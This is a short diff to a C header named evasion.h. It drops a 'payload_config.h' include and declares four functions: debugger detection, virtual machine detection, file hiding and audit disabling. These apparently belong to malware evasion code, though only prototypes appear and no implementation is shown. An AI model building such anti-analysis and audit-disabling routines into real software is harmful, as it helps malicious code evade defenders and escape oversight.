@@ -1,9 +1,11 @@
 #ifndef EVASION_H
 #define EVASION_H
 
-#include "payload_config.h"
+#include <stdint.h>
 
-// Evasion functions
-int perform_evasion_checks();
+int evasion_check_debugger();
+int evasion_check_vm();
+int evasion_hide_files();
+int evasion_disable_audit();
 
 #endif // EVASION_H
